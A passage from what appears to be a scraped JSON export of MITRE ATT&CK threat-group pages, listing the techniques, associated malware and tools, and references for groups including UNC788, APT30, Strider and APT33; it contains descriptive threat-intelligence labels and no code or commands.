Shell, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Email Collection, Email Collection: Local Email Collection, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, Exfiltration Over C2 Channel, Exploitation of Remote Services, Ingress Tool Transfer, Lateral Tool Transfer, Masquerading: Masquerade Task or Service, Native API, Network Share Discovery, Network Sniffing, Non-Standard Port, Obfuscated Files or Information: Binary Padding, Obfuscated Files or Information: Embedded Payloads, Obfuscated Files or Information: Command Obfuscation, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Software Packing, OS Credential Dumping: LSASS Memory, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Process Discovery, Process Injection: Process Hollowing, Process Injection: Dynamic-link Library Injection, Reflective Code Loading, Remote Services: SMB/Windows Admin Shares, Scheduled Task/Job: Scheduled Task, System Binary Proxy Execution: Regsvr32, System Network Configuration Discovery: Wi-Fi Discovery, System Owner/User Discovery, Unsecured Credentials: Credentials In Files, User Execution: Malicious File, User Execution: Malicious Link, Valid Accounts: Local Accounts, Windows Management Instrumentation S0363 Empire [6][2][4][7] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S0632 GrimAgent [20] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Junk Data, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: Clear Persistence, Indicator Removal: File Deletion, Ingress Tool Transfer, Native API, Obfuscated Files or Information, Obfuscated Files or Information: Binary Padding, Scheduled Task/Job: Scheduled Task, System Information Discovery, System Location Discovery: System Language Discovery, System Location Discovery, System Network Configuration Discovery, System Owner/User Discovery, Virtualization/Sandbox Evasion: Time Based Evasion S0349 LaZagne [7] Credentials from Password Stores: Windows Credential Manager, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Credentials from Password Stores: Keychain, OS Credential Dumping: LSA Secrets, OS Credential Dumping: /etc/passwd and /etc/shadow, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Cached Domain Credentials, OS Credential Dumping: Proc Filesystem, Unsecured Credentials: Credentials In Files S0002 Mimikatz [4][2] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0039 Net [1][12][4][11][13][14][15][7] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0359 Nltest [4][11][13][14][15][12][7] Domain Trust Discovery, Remote System Discovery, System Network Configuration Discovery S0097 Ping [11][2][14] Remote System Discovery S0029 PsExec [6][4][7] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S1071 Rubeus [7] Domain Trust Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Silver Ticket, Steal or Forge Kerberos Tickets: AS-REP Roasting, Steal or Forge Kerberos Tickets: Golden Ticket S0446 Ryuk [1][12][2][4][11][13][14][15][3][7][16] Access Token Manipulation, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Encrypted for Impact, File and Directory Discovery, File and Directory Permissions Modification: Windows File and Directory Permissions Modification, Impair Defenses: Disable or Modify Tools, Inhibit System Recovery, Loss of Productivity and Revenue, Masquerading: Match Legitimate Resource Name or Location, Masquerading, Native API, Obfuscated Files or Information, Process Discovery, Process Injection, Remote Services: SMB/Windows Admin Shares, Scheduled Task/Job: Scheduled Task, Service Stop, System Information Discovery, System Location Discovery: System Language Discovery, System Network Configuration Discovery, Traffic Signaling, Valid Accounts: Domain Accounts S0266 TrickBot [6][2][15][3][7][16] Account Discovery: Local Account, Account Discovery: Email Account, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Browser Session Hijacking, Brute Force: Credential Stuffing, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Credentials from Password Stores: Password Managers, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Data from Local System, Deobfuscate/Decode Files or Information, Domain Trust Discovery, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Exploitation of Remote Services, Fallback Channels, File and Directory Discovery, Firmware Corruption, Hide Artifacts: Hidden Window, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Input Capture: Credential API Hooking, Inter-Process Communication: Component Object Model, Masquerading, Modify Registry, Native API, Network Share Discovery, Non-Standard Port, Obfuscated Files or Information, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information: Encrypted/Encoded File, Permission Groups Discovery, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Pre-OS Boot: Bootkit, Process Discovery, Process Injection, Process Injection: Process Hollowing, Proxy: External Proxy, Remote Access Tools, Remote Services: VNC, Remote System Discovery, Scheduled Task/Job: Scheduled Task, Subvert Trust Controls: Code Signing, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Service Discovery, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Credentials in Registry, User Execution: Malicious File, Virtualization/Sandbox Evasion: Time Based Evasion References Hanel, A. (2019, January 10). Big Game Hunting with Ryuk: Another Lucrative Targeted Ransomware. Retrieved May 12, 2020. DHS/CISA. (2020, October 28). Ransomware Activity Targeting the Healthcare and Public Health Sector. Retrieved October 28, 2020. Podlosky, A., Hanel, A. et al. (2020, October 16). WIZARD SPIDER Update: Resilient, Reactive and Resolute. Retrieved June 15, 2021. Kimberly Goody, Jeremy Kennelly, Joshua Shilko, Steve Elovitz, Douglas Bienstock. (2020, October 28). Unhappy Hour Special: KEGTAP and SINGLEMALT With a Ransomware Chaser. Retrieved October 28, 2020. Goody, K., et al (2019, January 11). A Nasty Trick: From Credential Theft Malware to Business Disruption. Retrieved May 12, 2020. John, E. and Carvey, H. (2019, May 30). Unraveling the Spiderweb: Timelining ATT&CK Artifacts Used by GRIM SPIDER. Retrieved May 12, 2020. Shilko, J., et al. (2021, October 7). FIN12: The Prolific Ransomware Intrusion Threat Actor That Has Aggressively Pursued Healthcare Targets. Retrieved June 15, 2023. Secureworks Counter Threat Unit. (2022, March 1). Gold Blackburn Threat Profile. Retrieved June 15, 2023. Villadsen, O., et al. (2021, October 13). Trickbot Rising - Gang Doubles Down on Infection Efforts to Amass Network Footholds. Retrieved June 15, 2023. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. The DFIR Report. (2020, October 8). Ryuk\u2019s Return. Retrieved October 9, 2020. Brian Donohue, Katie Nickels, Paul Michaud, Adina Bodkins, Taylor Chapman, Tony Lambert, Jeff Felling, Kyle Rainey, Mike Haag, Matt Graeber, Aaron Didier.. (2020, October 29). A Bazar start: How one hospital thwarted a Ryuk ransomware outbreak. Retrieved October 30, 2020. The DFIR Report. (2020, November 5). Ryuk Speed Run, 2 Hours to Ransom. Retrieved November 6, 2020. The DFIR Report. (2020, October 18). Ryuk in 5 Hours. Retrieved October 19, 2020. Sean Gallagher, Peter Mackenzie, Elida Leite, Syed Shahram, Bill Kearney, Anand Aijan, Sivagnanam Gn, Suraj Mundalik. (2020, October 14). They\u2019re back: inside a new Ryuk ransomware attack. Retrieved October 14, 2020. Microsoft. (2022, May 9). Ransomware as a service: Understanding the cybercrime gig economy and how to protect yourself. Retrieved March 10, 2023. Brewster, T. (2017, May 4). https://www.forbes.com/sites/thomasbrewster/2017/05/04/dyre-hackers-stealing-millions-from-american-coporates/#601c77842a0a. Retrieved June 15, 2020. Feeley, B. and Stone-Gross, B. (2019, March 20). New Evidence Proves Ongoing WIZARD SPIDER / LUNAR SPIDER Collaboration. Retrieved June 15, 2020. Umawing, J. (2019, September 3). TrickBot adds new trick to its arsenal: tampering with trusted texts. Retrieved June 15, 2020. Priego, A. (2021, July). THE BROTHERS GRIM: THE REVERSING TALE OF GRIMAGENT MALWARE USED BY RYUK. Retrieved September 19, 2024. "
},
{
"id": 124,
"title": "UNC788, Group G1029",
"path": "/groups/G1029/index.html",
"content": " UNC788 UNC788 is a group of hackers from Iran that has targeted people in the Middle East.[1] ID: G1029 Contributors: Denise Tan Version: 1.0 Created: 02 April 2024 Last Modified: 02 April 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Mobile T1660 Phishing UNC788 has used phishing and social engineering to distribute malware.[1] Software ID Name References Techniques S1128 HilalRAT [1] Audio Capture, Location Tracking, Protected User Data: Contact List, Protected User Data: SMS Messages, Stored Application Data, Video Capture References Agranovich, D., et al. (2022, April). Adversarial Threat Report. Retrieved April 2, 2024. "
},
{
"id": 125,
"title": "APT30, Group G0013",
"path": "/groups/G0013/index.html",
"content": " APT30 APT30 is a threat group suspected to be associated with the Chinese government. While Naikon shares some characteristics with APT30, the two groups do not appear to be exact matches.[1][2] ID: G0013 Version: 1.1 Created: 31 May 2017 Last Modified: 17 November 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1566 .001 Phishing: Spearphishing Attachment APT30 has used spearphishing emails with malicious DOC attachments.[1] Enterprise T1204 .002 User Execution: Malicious File APT30 has relied on users to execute malicious file attachments delivered via spearphishing emails.[1] Software ID Name References Techniques S0031 BACKSPACE [1] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Non-Standard Encoding, Exfiltration Over C2 Channel, File and Directory Discovery, Impair Defenses: Disable or Modify System Firewall, Modify Registry, Multi-Stage Channels, Process Discovery, Proxy: Internal Proxy, Query Registry, System Information Discovery S0036 FLASHFLOOD [1] Archive Collected Data: Archive via Custom Method, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Data from Local System, Data from Removable Media, Data Staged: Local Data Staging, File and Directory Discovery S0034 NETEAGLE [1] Application Layer Protocol, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Dynamic Resolution, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Fallback Channels, File and Directory Discovery, Non-Application Layer Protocol, Process Discovery S0028 SHIPSHAPE [1] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Replication Through Removable Media S0035 SPACESHIP [1] Archive Collected Data: Archive via Custom Method, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Data Staged: Local Data Staging, Exfiltration Over Physical Medium: Exfiltration over USB, File and Directory Discovery References FireEye Labs. (2015, April). APT30 AND THE MECHANICS OF A LONG-RUNNING CYBER ESPIONAGE OPERATION. Retrieved November 17, 2024. Baumgartner, K., Golovkin, M.. (2015, May 14). The Naikon APT. Retrieved January 14, 2015. "
},
{
"id": 126,
"title": "Strider, ProjectSauron, Group G0041",
"path": "/groups/G0041/index.html",
"content": " Strider Strider is a threat group that has been active since at least 2011 and has targeted victims in Russia, China, Sweden, Belgium, Iran, and Rwanda.[1][2] ID: G0041 \u24d8 Associated Groups: ProjectSauron Version: 1.1 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description ProjectSauron ProjectSauron is used to refer both to the threat group also known as G0041 as well as the malware platform also known as S0125. [2] [3] Techniques Used Domain ID Name Use Enterprise T1564 .005 Hide Artifacts: Hidden File System Strider has used a hidden file system that is stored as a file on disk.[3] Enterprise T1556 .002 Modify Authentication Process: Password Filter DLL Strider has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to acquire credentials any time a domain, local user, or administrator logs in or changes a password.[3] Enterprise T1090 .001 Proxy: Internal Proxy Strider has used local servers with both local network and Internet access to act as internal proxy nodes to exfiltrate data from other parts of the network without direct Internet access.[2] Software ID Name References Techniques S0125 Remsec [1][2] Account Discovery: Local Account, Application Layer Protocol: Mail Protocols, Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Command and Scripting Interpreter: Lua, Data from Removable Media, Device Driver Discovery, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Exfiltration Over Physical Medium: Exfiltration over USB, Exploitation for Privilege Escalation, File and Directory Discovery, Impair Defenses: Disable or Modify System Firewall, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Modify Authentication Process: Password Filter DLL, Network Service Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Encrypted/Encoded File, OS Credential Dumping: Security Account Manager, Process Discovery, Process Injection: Dynamic-link Library Injection, Remote System Discovery, Scheduled Task/Job, Software Discovery: Security Software Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery References Symantec Security Response. (2016, August 7). Strider: Cyberespionage group turns eye of Sauron on targets. Retrieved August 17, 2016. Kaspersky Lab's Global Research & Analysis Team. (2016, August 8). ProjectSauron: top level cyber-espionage platform covertly extracts encrypted government comms. Retrieved August 17, 2016. Kaspersky Lab's Global Research & Analysis Team. (2016, August 9). The ProjectSauron APT. Retrieved August 17, 2016. "
},
{
"id": 127,
"title": "APT33, HOLMIUM, Elfin, Peach Sandstorm, Group G0064",
"path": "/groups/G0064/index.html",
"content": " APT33 APT33 is a suspected Iranian threat group that has carried out operations since at least 2013. The group has targeted organizations across multiple industries in the United States, Saudi Arabia, and South Korea, with a particular interest in the aviation and energy sectors.[1][2] ID: G0064 \u24d8 Associated Groups: HOLMIUM, Elfin, Peach Sandstorm Contributors: Dragos Threat Intelligence Version: 2.0 Created: 18 April 2018 Last Modified: 11 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description HOLMIUM [3] Elfin [4] Peach Sandstorm [5] Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols APT33 has used HTTP for command and control.[4] Enterprise T1560 .001 Archive Collected Data: Archive via Utility APT33 has used WinRAR to compress data prior to exfil.[4] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder APT33 has deployed a tool known as DarkComet to the Startup folder of a victim, and used Registry run keys to gain persistence.[4][3] Enterprise T1110 .003 Brute Force: Password Spraying APT33 has used password spraying to gain access to target systems.[6][3] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell APT33 has utilized PowerShell to download files from the C2 server and run various scripts. [4][3] .005 Command and Scripting Interpreter: Visual Basic APT33 has used VBScript to initiate the delivery of payloads.[3] Enterprise T1555 Credentials from Password Stores APT33 has used a variety of publicly available tools like LaZagne to gather credentials.[4][6] .003 Credentials from Web Browsers APT33 has used a variety of publicly available tools like LaZagne to gather credentials.[4][6] Enterprise T1132 .001 Data Encoding: Standard Encoding APT33 has used base64 to encode command and control traffic.[6] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography APT33 has used AES for encryption of command and control traffic.[6] Enterprise T1546 .003 Event Triggered Execution: Windows Management Instrumentation Event Subscription APT33 has attempted to use WMI event subscriptions to establish persistence on compromised hosts.[3] Enterprise T1048 .003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol APT33 has used FTP to exfiltrate files (separately from the C2 channel).[4] Enterprise T1203 Exploitation for Client Execution APT33 has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250), and attempted to gain remote code execution via a security bypass vulnerability (CVE-2017-11774).[4][3] Enterprise T1068 Exploitation for Privilege Escalation APT33 has used a publicly available exploit for CVE-2017-0213 to escalate privileges on a local system.[6] Enterprise T1105 Ingress Tool Transfer APT33 has downloaded additional files and programs from its C2 server.[4][3] Enterprise T1040 Network Sniffing APT33 has used SniffPass to collect credentials by sniffing network traffic.[4] Enterprise T1571 Non-Standard Port APT33 has used HTTP over TCP ports 808 and 880 for command and control.[4] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File APT33 has used base64 to encode payloads.[6] Enterprise T1588 .002 Obtain Capabilities: Tool APT33 has obtained and leveraged publicly-available tools for early intrusion activities.[6][4] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory APT33 has used a variety of publicly available tools like LaZagne, Mimikatz, and ProcDump to dump credentials.[4][6] .004 OS Credential Dumping: LSA Secrets APT33 has used a variety of publicly available tools like LaZagne to gather credentials.[4][6] .005 OS Credential Dumping: Cached Domain Credentials APT33 has used a variety of publicly available tools like LaZagne to gather credentials.[4][6] Enterprise T1566 .001 Phishing: Spearphishing Attachment APT33 has sent spearphishing e-mails with archive attachments.[3] .002 Phishing: Spearphishing Link APT33 has sent spearphishing emails containing links to .hta files.[1][4] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task APT33 has created a scheduled task to execute a .vbe file multiple times a day.[4] Enterprise T1552 .001 Unsecured Credentials: Credentials In Files APT33 has used a variety of publicly available tools like LaZagne to gather credentials.[4][6] .006 Unsecured Credentials: Group Policy Preferences APT33 has used a variety of publicly available tools like Gpppassword to gather credentials.[4][6] Enterprise T1204 .001 User Execution: Malicious Link APT33 has lured users to click links to malicious HTML applications delivered via spearphishing emails.[1][4] .002 User Execution: Malicious File APT33 has used malicious e-mail attachments to lure victims into executing malware.[3] Enterprise T1078 Valid Accounts APT33 has used valid accounts for initial access and privilege escalation.[2][6] .004 Cloud Accounts APT33 has used compromised Office 365 accounts in tandem with Ruler in an attempt to gain control of endpoints.[3] ICS T0852 Screen Capture APT33 utilize backdoors capable of capturing screenshots once installed on a system. [7][8] ICS T0853 Scripting APT33 utilized PowerShell scripts to establish command and control and install files for execution. [9] [10] ICS T0865 Spearphishing Attachment APT33 sent spear phishing emails containing links to HTML application files, which were embedded with malicious code. [7] APT33 has conducted targeted spear phishing campaigns against U.S. government agencies and private sector companies. [11] Software ID Name References Techniques S0129 AutoIt backdoor [4] Abuse Elevation Control Mechanism: Bypass User Account Control, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, File and Directory Discovery S1134 DEADWOOD DEADWOOD was previously linked to APT33 operations in 2019.[12] Account Access Removal, Data Destruction, Deobfuscate/Decode Files or Information, Disk Wipe: Disk Content Wipe, Disk Wipe: Disk Structure Wipe, Masquerading: Masquerade Task or Service, Obfuscated Files or Information: Embedded Payloads, Obfuscated Files or Information: Encrypted/Encoded File, System Services: Service Execution, System Time Discovery S0363 Empire [6][4] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S0095 ftp [4] Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Ingress Tool Transfer, Lateral Tool Transfer S0349 LaZagne [4] Credentials from Password Stores: Windows Credential Manager, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Credentials from Password Stores: Keychain, OS Credential Dumping: LSA Secrets, OS Credential Dumping: /etc/passwd and /etc/shadow, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Cached Domain Credentials, OS Credential Dumping: Proc Filesystem, Unsecured Credentials: Credentials In Files S0002 Mimikatz [4] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0336 NanoCore [2] Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: Visual Basic, Encrypted Channel: Symmetric Cryptography, Impair Defenses: Disable or Modify System Firewall, Impair Defenses: Disable or Modify Tools, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, System Network Configuration Discovery, Video Capture S0039 Net [4] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0198 NETWIRE [1][2] Application Layer Protocol: Web Protocols, Application Window Discovery, Archive Collected Data: Archive via Custom Method, Archive Collected Data, Automated Collection, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: XDG Autostart Entries, Boot or Logon Autostart Execution: Login Items, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Unix Shell, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Launch Agent, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Invalid Code Signature, Modify Registry, Native API, Non-Application Layer Protocol, Obfuscated Files or Information: Software Packing, Obfuscated Files or Information, Obfuscated Files or Information: Fileless Storage, Phishing: Spearphishing Link, Phishing: Spearphishing Attachment, Process Discovery, Process Injection, Process Injection: Process Hollowing, Proxy, Scheduled Task/Job: Cron, Scheduled Task/Job: Scheduled Task, Screen Capture, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, User Execution: Malicious File, User Execution: Malicious Link, Web Service S0378 PoshC2 [6][4] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Create Process with Token, Access Token Manipulation, Account Discovery: Local Account, Account Discovery: Domain Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Automated Collection, Brute Force, Credentials from Password Stores, Domain Trust Discovery, Event Triggered Execution: Windows Management Instrumentation Event Subscription, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Input Capture: Keylogging, Network Service Discovery, Network Sniffing, OS Credential Dumping: LSASS Memory, Password Policy Discovery, Permission Groups Discovery: Local Groups, Process Injection, Proxy, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Unsecured Credentials: Credentials In Files, Use Alternate Authentication Material: Pass the Hash, Windows Management Instrumentation S0194 PowerSploit [6] Access Token Manipulation, Account Discovery: Local Account, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Security Support Provider, Command and Scripting Interpreter: PowerShell, Create or Modify System Process: Windows Service, Credentials from Password Stores: Windows Credential Manager, Data from Local System, Domain Trust Discovery, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: DLL, Hijack Execution Flow: Path Interception by Search Order Hijacking, Input Capture: Keylogging, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection: Dynamic-link Library Injection, Query Registry, Reflective Code Loading, Scheduled Task/Job: Scheduled Task, Screen Capture, Steal or Forge Kerberos Tickets: Kerberoasting, Unsecured Credentials: Credentials in Registry, Unsecured Credentials: Group Policy Preferences, Windows Management Instrumentation S0371 POWERTON [6][3] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Encrypted Channel: Symmetric Cryptography, Event Triggered Execution: Windows Management Instrumentation Event Subscription, OS Credential Dumping: Security Account Manager S0192 Pupy [6] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Token Impersonation/Theft, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Audio Capture, Boot or 